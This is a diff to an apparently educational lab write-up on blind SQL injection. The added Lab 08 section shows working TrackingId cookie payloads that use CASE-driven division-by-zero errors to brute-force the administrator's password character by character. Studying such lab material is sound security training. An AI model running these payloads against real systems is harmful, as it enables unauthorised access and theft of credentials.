@@ -290,8 +290,6 @@ Use `||` to concatenate 2 strings, and you can use any delimiter to distinguish 
 > Goal: Log in as the administrator user.
 
 #### Recon
-
-
 For this lab, `TrackingID` cookie is being queried and compared with the data in database. Usually cookies are being used to track preferences of user when they revisit the website and sometimes it's being used for personalization content. This include showing things like "Welcome back, [user]" etc.
 
 Normally, we can see "Welcome back" is shown in the homepage. 
@@ -328,3 +326,44 @@ We now brute-force each character of admin's password. By using Burp Intruder an
 TrackingId=cNwUOjEs3mWPCEtS' AND SUBSTR((SELECT password FROM users WHERE username='administrator'), 1, 1)='f'--
 ```
 <img width="1555" height="615" alt="image" src="https://github.com/user-attachments/assets/e42ee6db-ccd2-4dd2-8521-3153163315c5" />
+
+### Lab 08: Blind SQLi with conditional errors
+
+> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an
+> error, then the application returns a custom error message.
+>
+> The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the
+> password of the administrator user.
+>
+> Goal: Log in as the administrator user.
+
+#### Recon
+This lab also queries the `TrackingID` cookie like previous lab. Simple test on the cookie using single quote will return an error to the page and 2 single quotes will complete the syntax. Include comment at the end to remove additional SQL.
+
+Even though this subquery does not return any rows, it's still a valid SQL statement, so the application does not produce an error. Therefore, we need a technique that forces the database to error out under specific conditions.
+```sql
+TrackingId=llAYAzMok8oSbWEr' AND (SELECT LENGTH(password) FROM users where username='administrator')>30--
+```
+<img width="1398" height="571" alt="image" src="https://github.com/user-attachments/assets/77ee9343-8be6-4c1d-b981-0bb4322458fe" />
+
+
+The simplest way to trigger an error is to perform an illegal operation such as division by zero.
+```sql
+TrackingId=llAYAzMok8oSbWEr' AND SELECT 1/0 FROM dual--
+```
+However, this alone always causes an error and doesn't help with boolean logic. To make the error conditional, we use a CASE statement:
+
+- If `true`, the expression executes 1/0 and server returns status code 500.
+- If `false`, the query returns 1 and page loads normally.
+
+In this case, `1=1` will give error page due to condition is true.
+```sql
+TrackingId=llAYAzMok8oSbWEr' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END FROM dual)=1--
+```
+<img width="1284" height="549" alt="image" src="https://github.com/user-attachments/assets/05d72db3-1891-43b3-817c-b9e1470d677b" />
+
+Now we can brute-force each character of the password by comparing substrings. If the guessed character is correct, we intentionally trigger a division-by-zero error.
+```sql
+ TrackingId=llAYAzMok8oSbWEr' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users WHERE username='administrator')=1--
+```
+<img width="1804" height="670" alt="image" src="https://github.com/user-attachments/assets/1dcb82ad-fa2e-4d9a-8b3e-1f62425e4af1" />
